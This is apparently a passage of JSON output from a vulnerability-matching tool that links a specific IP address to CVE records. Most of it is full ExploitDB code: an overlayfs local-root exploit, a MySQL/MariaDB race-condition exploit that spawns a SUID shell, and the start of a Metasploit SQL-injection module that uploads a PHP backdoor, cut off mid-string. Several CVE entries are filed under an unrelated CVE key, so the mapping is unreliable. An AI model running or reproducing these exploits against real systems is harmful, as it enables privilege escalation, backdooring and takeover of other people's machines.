                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.14.114.236": {
        "CVE-2016-10708": [
            {
                "source": "CVE",
                "_id": "2016-10708",
                "description": "sshd in OpenSSH before 7.4 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an out-of-sequence NEWKEYS message, as demonstrated by Honggfuzz, related to kex.c and packet.c.",
                "osvdb": [],
                "bid": [
                    102780
                ],
                "cve": [
                    "CVE-2016-10708"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0777": [
            {
                "source": "CVE",
                "_id": "2016-10119",
                "description": "Firejail uses 0777 permissions when mounting /tmp, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10119"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-10120",
                "description": "Firejail uses 0777 permissions when mounting (1) /dev, (2) /dev/shm, (3) /var/tmp, or (4) /var/lock, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10120"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-0777",
                "description": "The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory by requesting transmission of an entire buffer, as demonstrated by reading a private key.",
                "osvdb": [],
                "bid": [
                    80695
                ],
                "cve": [
                    "CVE-2016-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-8605",
                "description": "The mkdir procedure of GNU Guile temporarily changed the process' umask to zero. During that time window, in a multithreaded application, other threads could end up creating files with insecure permissions. For example, mkdir without the optional mode argument would create directories as 0777. This is fixed in Guile 2.0.13. Prior versions are affected.",
                "osvdb": [],
                "bid": [
                    93510
                ],
                "cve": [
                    "CVE-2016-8605"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "code": "/*\r\njust another overlayfs exploit, works on kernels before 2015-12-26\r\n\r\n# Exploit Title: overlayfs local root\r\n# Date: 2016-01-05\r\n# Exploit Author: rebel\r\n# Version: Ubuntu 14.04 LTS, 15.10 and more\r\n# Tested on: Ubuntu 14.04 LTS, 15.10\r\n# CVE : CVE-2015-8660\r\n\r\nblah@ubuntu:~$ id\r\nuid=1001(blah) gid=1001(blah) groups=1001(blah)\r\nblah@ubuntu:~$ uname -a && cat /etc/issue\r\nLinux ubuntu 3.19.0-42-generic #48~14.04.1-Ubuntu SMP Fri Dec 18 10:24:49 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\r\nUbuntu 14.04.3 LTS \\n \\l\r\nblah@ubuntu:~$ ./overlayfail\r\nroot@ubuntu:~# id\r\nuid=0(root) gid=1001(blah) groups=0(root),1001(blah)\r\n\r\n12/2015\r\nby rebel\r\n\r\n6354b4e23db225b565d79f226f2e49ec0fe1e19b\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <sched.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <sys/types.h>\r\n#include <signal.h>\r\n#include <fcntl.h>\r\n#include <string.h>\r\n#include <linux/sched.h>\r\n#include <sys/wait.h>\r\n\r\nstatic char child_stack[1024*1024];\r\n\r\nstatic int\r\nchild_exec(void *stuff)\r\n{\r\n    system(\"rm -rf /tmp/haxhax\");\r\n    mkdir(\"/tmp/haxhax\", 0777);\r\n    mkdir(\"/tmp/haxhax/w\", 0777);\r\n    mkdir(\"/tmp/haxhax/u\",0777);\r\n    mkdir(\"/tmp/haxhax/o\",0777);\r\n\r\n    if (mount(\"overlay\", \"/tmp/haxhax/o\", \"overlay\", MS_MGC_VAL, \"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w\") != 0) {\r\n\tfprintf(stderr,\"mount failed..\\n\");\r\n    }\r\n\r\n    chmod(\"/tmp/haxhax/w/work\",0777);\r\n    chdir(\"/tmp/haxhax/o\");\r\n    chmod(\"bash\",04755);\r\n    chdir(\"/\");\r\n    umount(\"/tmp/haxhax/o\");\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char **argv)\r\n{\r\n    int status;\r\n    pid_t wrapper, init;\r\n    int clone_flags = CLONE_NEWNS | SIGCHLD;\r\n    struct stat s;\r\n\r\n    if((wrapper = fork()) == 0) {\r\n        if(unshare(CLONE_NEWUSER) != 0)\r\n            fprintf(stderr, \"failed to create new user namespace\\n\");\r\n\r\n        if((init = fork()) == 0) {\r\n            pid_t pid =\r\n                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);\r\n            if(pid < 0) {\r\n                fprintf(stderr, \"failed to create new mount namespace\\n\");\r\n                exit(-1);\r\n            }\r\n\r\n            waitpid(pid, &status, 0);\r\n\r\n        }\r\n\r\n        waitpid(init, &status, 0);\r\n        return 0;\r\n    }\r\n\r\n    usleep(300000);\r\n\r\n    wait(NULL);\r\n\r\n    stat(\"/tmp/haxhax/u/bash\",&s);\r\n\r\n    if(s.st_mode == 0x89ed)\r\n        execl(\"/tmp/haxhax/u/bash\",\"bash\",\"-p\",\"-c\",\"rm -rf /tmp/haxhax;python -c \\\"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\\\"\",NULL);\r\n\r\n    fprintf(stderr,\"couldn't create suid :(\\n\");\r\n    return -1;\r\n}",
                "description": "Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)",
                "author": "rebel",
                "_id": 39166,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-01-05T00:00:00+00:00",
                "cve": [
                    "CVE-2015-8660"
                ],
                "type": "local",
                "port": 0
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            },
            {
                "code": "/*\r\n\r\nSource: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c\r\n\r\nMySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\r\nmysql-privesc-race.c (ver. 1.0)\r\n\r\nCVE-2016-6663 / OCVE-2016-5616\r\n\r\nDiscovered/Coded by:\r\n\r\nDawid Golunski\r\ndawid[at]legalhackers.com\r\nhttps://legalhackers.com\r\n\r\nFollow https://twitter.com/dawid_golunski for updates on this advisory.\r\n\r\n\r\nCompile:\r\ngcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient\r\n\r\nNote:\r\n* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)\r\n\r\n* For testing purposes only. Do no harm.  \r\n\r\nFull advisory URL:\r\nhttps://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html\r\n\r\nVideo PoC:\r\nhttps://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html\r\n\r\n*/\r\n\r\n\r\n#include <fcntl.h>\r\n#include <grp.h>\r\n#include <mysql.h>\r\n#include <pwd.h>\r\n#include <stdint.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/inotify.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <time.h>\r\n#include <unistd.h>\r\n\r\n\r\n#define EXP_PATH          \"/tmp/mysql_privesc_exploit\"\r\n#define EXP_DIRN          \"mysql_privesc_exploit\"\r\n#define MYSQL_TAB_FILE    EXP_PATH \"/exploit_table.MYD\"\r\n#define MYSQL_TEMP_FILE   EXP_PATH \"/exploit_table.TMD\"\r\n\r\n#define SUID_SHELL   \t  EXP_PATH \"/mysql_suid_shell.MYD\"\r\n\r\n#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary\r\n\r\nMYSQL *conn;\t\t  // DB handles\r\nMYSQL_RES *res;\r\nMYSQL_ROW row;\r\n\r\nunsigned long cnt;\r\n\r\n\r\nvoid intro() {\r\n\r\nprintf( \r\n        \"\\033[94m\\n\"\r\n        \"MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\\n\"\r\n        \"mysql-privesc-race.c (ver. 1.0)\\n\\n\"\r\n        \"CVE-2016-6663 / OCVE-2016-5616\\n\\n\"\r\n        \"For testing purposes only. Do no harm.\\n\\n\"\r\n\t\"Discovered/Coded by:\\n\\n\"\r\n\t\"Dawid Golunski \\n\"\r\n\t\"http://legalhackers.com\"\r\n        \"\\033[0m\\n\\n\");\r\n\r\n}\r\n\r\nvoid usage(char *argv0) {\r\n    intro();\r\n    printf(\"Usage:\\n\\n%s user pass db_host database\\n\\n\", argv0);\r\n}\r\n\r\nvoid mysql_cmd(char *sql_cmd, int silent) {\r\n    \r\n    if (!silent) {\r\n\t    printf(\"%s \\n\", sql_cmd);\r\n    }\r\n    if (mysql_query(conn, sql_cmd)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n    res = mysql_store_result(conn);\r\n    if (res>0) mysql_free_result(res);\r\n\r\n}\r\n\r\n\r\nint main(int argc,char **argv)\r\n{\r\n\r\n    int randomnum = 0;\r\n    int io_notified = 0;\r\n    int myd_handle;\r\n    int wpid;\r\n    int is_shell_suid=0;\r\n    pid_t pid;\r\n    int status;\r\n    struct stat st;\r\n    /* io notify */\r\n    int fd;\r\n    int ret;\r\n    char buf[4096] __attribute__((aligned(8)));\r\n    int num_read;\r\n    struct inotify_event *event;\r\n    /* credentials */\r\n    char *user     = argv[1];\r\n    char *password = argv[2];\r\n    char *db_host  = argv[3];\r\n    char *database = argv[4];\r\n\r\n\r\n    // Disable buffering of stdout\r\n    setvbuf(stdout, NULL, _IONBF, 0);\r\n\r\n    // Get the params\r\n    if (argc!=5) {\r\n\tusage(argv[0]);\r\n\texit(1);\r\n    } \r\n    intro();\r\n    // Show initial privileges\r\n    printf(\"\\n[+] Starting the exploit as: \\n\");\r\n    system(\"id\");\r\n\r\n    // Connect to the database server with provided credentials\r\n    printf(\"\\n[+] Connecting to the database `%s` as %s@%s\\n\", database, user, db_host);\r\n    conn = mysql_init(NULL);\r\n    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n\r\n    // Prepare tmp dir\r\n    printf(\"\\n[+] Creating exploit temp directory %s\\n\", \"/tmp/\" EXP_DIRN);\r\n    umask(000);\r\n    system(\"rm -rf /tmp/\" EXP_DIRN \" && mkdir /tmp/\" EXP_DIRN);\r\n    system(\"chmod g+s /tmp/\" EXP_DIRN );\r\n\r\n    // Prepare exploit tables :)\r\n    printf(\"\\n[+] Creating mysql tables \\n\\n\");\r\n    mysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 0);\r\n    mysql_cmd(\"DROP TABLE IF EXISTS mysql_suid_shell\", 0);\r\n    mysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n    mysql_cmd(\"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n\r\n    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file\r\n    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory\r\n    printf(\"\\n[+] Copying bash into the mysql_suid_shell table.\\n    After the exploitation the following file/table will be assigned SUID and executable bits : \\n\");\r\n    system(\"cp /bin/bash \" SUID_SHELL);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    // Use inotify to get the timing right\r\n    fd = inotify_init();\r\n    if (fd < 0) {\r\n        printf(\"failed to inotify_init\\n\");\r\n        return -1;\r\n    }\r\n    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);\r\n\r\n\r\n    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */\r\n\r\n    printf(\"\\n[+] Entering the race loop... Hang in there...\\n\");\r\n\r\n    while ( is_shell_suid != 1 ) {\r\n\r\n        cnt++;\r\n\tif ( (cnt % 100) == 0 ) {\r\n\t \tprintf(\"->\");\r\n\t \t//fflush(stdout);\t\r\n\t}\r\n\r\n        /* Create empty file , remove if already exists */\r\n        unlink(MYSQL_TEMP_FILE);\r\n        unlink(MYSQL_TAB_FILE);\r\n   \tmysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 1);\r\n\tmysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 1);\r\n\r\n\t/* random num if needed */\r\n        srand ( time(NULL) );\r\n        randomnum = ( rand() % MAX_DELAY );\r\n\r\n        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink\r\n        pid = fork();\r\n        if (pid < 0) {\r\n            fprintf(stderr, \"Fork failed :(\\n\");\r\n        }\r\n\r\n        /* Child process - executes REPAIR TABLE  SQL statement */\r\n        if (pid == 0) {\r\n            usleep(500);\r\n            unlink(MYSQL_TEMP_FILE);\r\n\t    mysql_cmd(\"REPAIR TABLE exploit_table EXTENDED\", 1);\r\n            // child stops here\r\n            exit(0);\r\n        }\r\n\r\n        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */\r\n        if (pid > 0 ) {\r\n            io_notified = 0;\r\n\r\n            while (1) {\r\n                int processed = 0;\r\n                ret = read(fd, buf, sizeof(buf));\r\n                if (ret < 0) {\r\n                    break;\r\n                }\r\n                while (processed < ret) {\r\n                    event = (struct inotify_event *)(buf + processed);\r\n                    if (event->mask & IN_CLOSE) {\r\n                        if (!strcmp(event->name, \"exploit_table.TMD\")) {\r\n                            //usleep(randomnum);\r\n\r\n\t\t\t    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file \r\n\t\t\t    unlink(MYSQL_TAB_FILE);\r\n\t\t\t    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);\r\n\t\t\t    close(myd_handle);\r\n\t\t\t    chmod(MYSQL_TAB_FILE, 04777);\r\n\r\n\t\t\t    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec\r\n                            unlink(MYSQL_TEMP_FILE);\r\n                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);\r\n                            io_notified=1;\r\n                        }\r\n                    }\r\n                    processed += sizeof(struct inotify_event);\r\n                }\r\n                if (io_notified) {\r\n                    break;\r\n                }\r\n            }\r\n\r\n\r\n            waitpid(pid, &status, 0);\r\n        }\r\n\r\n\t// Check if SUID bit was set at the end of this attempt\r\n        if ( lstat(SUID_SHELL, &st) == 0 ) {\r\n\t    if (st.st_mode & S_ISUID) {\r\n\t\tis_shell_suid = 1;\r\n\t    }\r\n        } \r\n\r\n    }\r\n\r\n    printf(\"\\n\\n[+] \\033[94mBingo! Race won (took %lu tries) !\\033[0m Check out the \\033[94mmysql SUID shell\\033[0m: \\n\\n\", cnt);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    printf(\"\\n[+] Spawning the \\033[94mmysql SUID shell\\033[0m now... \\n    Remember that from there you can gain \\033[1;31mroot\\033[0m with vuln \\033[1;31mCVE-2016-6662\\033[0m or \\033[1;31mCVE-2016-6664\\033[0m :)\\n\\n\");\r\n    system(SUID_SHELL \" -p -i \");\r\n    //system(SUID_SHELL \" -p -c '/bin/bash -i -p'\");\r\n\r\n    /* close MySQL connection and exit */\r\n    printf(\"\\n[+] Job done. Exiting\\n\\n\");\r\n    mysql_close(conn);\r\n    return 0;\r\n\r\n}",
                "description": "MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition",
                "author": "Dawid Golunski",
                "_id": 40678,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-11-01T00:00:00+00:00",
                "cve": [
                    "CVE-2016-6663",
                    "CVE-2016-5616",
                    "CVE-2016-6662",
                    "CVE-2016-6664"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::FileDropper\r\n  include Msf::Exploit::EXE\r\n\r\n  WINDOWS = /^win/i\r\n  LINUX   = /linux/i\r\n\r\n  def initialize(info={})\r\n    super(update_info(info,\r\n      'Name'           => \"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\",\r\n      'Description'    => %q{\r\n        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail\r\n        parameter in exporters.php allows an attacker to write arbitrary files to the file system\r\n        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM\r\n        for Windows, or as Apache for Linux.\r\n\r\n        Authentication is required to exploit this vulnerability, but this module uses\r\n        the default admin:admin credential.\r\n      },\r\n      'License'        => MSF_LICENSE,\r\n      'Author'         =>\r\n        [\r\n          'bperry', # Original discovery, PoC, and Metasploit module\r\n          'sinn3r'  # Metasploit module for native support\r\n        ],\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2014-4977' ],\r\n          [ 'BID', '68495' ],\r\n          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Jul/44' ],\r\n          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]\r\n        ],\r\n      'Arch'           => [ ARCH_X86 ],\r\n      'Platform'       => [ 'win', 'linux' ],\r\n      'Targets'        =>\r\n        [\r\n          [ 'Automatic', {} ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 on Windows',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'win',\r\n            }\r\n          ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'linux'\r\n            }\r\n          ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'DisclosureDate' => 'Jul 24 2014',\r\n      'DefaultTarget'  => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, \"Base Application path\", \"/\" ]),\r\n        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),\r\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])\r\n      ], self.class)\r\n  end\r\n\r\n\r\n  # Prints a message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_status(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Prints an error message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_error(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Pads NULL columns for a SQL injection string.\r\n  #\r\n  # @param n [Fixnum] Number of nulls\r\n  # @return [String]\r\n  def pad_null(n)\r\n    padding = []\r\n\r\n    n.times do\r\n      padding << 'NULL'\r\n    end\r\n\r\n    padding * ','\r\n  end\r\n\r\n\r\n  # Checks (explicitly) the target for the vulnerability. To be able to check this, a\r\n  # valid username/password is required.\r\n  #\r\n  # @return [void]\r\n  def check\r\n    begin\r\n      res = do_login\r\n    rescue Msf::Exploit::Failed => e\r\n      vprint_error(e.message)\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    pattern = Rex::Text.rand_text_alpha(10)\r\n    sqli_str = \"-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern\r\n\r\n    Exploit::CheckCode::Safe\r\n  end\r\n\r\n\r\n  # Returns the OS information by using @@version_compile_os.\r\n  #\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [String] The OS information.\r\n  def get_os(sid, uid)\r\n    sqli_str = \"-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    res['id']\r\n  end\r\n\r\n\r\n  # Returns target's d4d directory path that will be used to upload our malicious files.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [String]\r\n  def get_d4d_path(os)\r\n    case os\r\n    when WINDOWS\r\n      # On Windows, the full d4d path looks something like this:\r\n      # C:\\Program Files\\Scrutinizer\\html\\d4d\r\n      '../../html/d4d'\r\n    when LINUX\r\n      # On the Linux appliance, the d4d path looks exactly like this:\r\n      '/home/plixer/scrutinizer/html/d4d'\r\n    end\r\n  end\r\n\r\n\r\n  # Logs into Dell SonicWALL Scrutinizer.\r\n  #\r\n  # @return [Hash] JSON response.\r\n  def do_login\r\n    res = send_request_cgi({\r\n      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),\r\n      'vars_get' => {\r\n        'name' => datastore['USERNAME'],\r\n        'pwd' => datastore['PASSWORD']\r\n      }\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')\r\n    end\r\n\r\n    res = res.get_json_document\r\n\r\n    if res['noldapnouser']\r\n      fail_with(Failure::NoAccess, \"Username '#{datastore['USERNAME']}' is incorrect.\")\r\n    elsif res['loginfailed']\r\n      fail_with(Failure::NoAccess, \"Password '#{datastore['PASSWORD']}' is incorrect.\")\r\n    end\r\n\r\n    report_cred(datastore['USERNAME'], datastore['PASSWORD'])\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Saves a valid username/password to database.\r\n  #\r\n  # @param username [String]\r\n  # @param password [String]\r\n  # @return [void]\r\n  def report_cred(username, password)\r\n    service_data = {\r\n      address: rhost,\r\n      port: rport,\r\n      service_name: ssl ? 'https' : 'http',\r\n      protocol: 'tcp',\r\n      workspace_id: myworkspace_id\r\n    }\r\n\r\n    credential_data = {\r\n      module_fullname: self.fullname,\r\n      origin_type: :service,\r\n      username: username,\r\n      private_data: password,\r\n      private_type: :password\r\n    }.merge(service_data)\r\n\r\n    credential_core = create_credential(credential_data)\r\n\r\n    login_data = {\r\n      core: credential_core,\r\n      last_attempted_at: DateTime.now,\r\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\r\n    }.merge(service_data)\r\n\r\n    create_credential_login(login_data)\r\n  end\r\n\r\n\r\n  # Injects malicious SQL string to the methodDetail parameter against the target machine.\r\n  #\r\n  # @param method_detail [String] Malicious SQL injection string.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [Rex::Proto::Http::Response]\r\n  def do_sqli(method_detail, sid, uid)\r\n    res = send_request_cgi({\r\n      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),\r\n      'vars_get' => { 'methodDetail'=> method_detail },\r\n      'cookie'   => \"cookiesenabled=1;sessionid=#{sid};userid=#{uid}\"\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')\r\n    end\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Returns a PHP backdoor that is to be uploaded onto the target machine.\r\n  #\r\n  # @param os [String] Target OS information.\r\n  # @param target_path [String]\r\n  # @return [String] PHP backdoor\r\n  def get_php_backdoor(os)\r\n    case os\r\n    when WINDOWS\r\n      chmod_code = %Q|chmod($bname, 0777);|\r\n      exec_code = %Q|exec($bname);|\r\n    when LINUX\r\n      chmod_code = %Q|chmod(\"./\" . 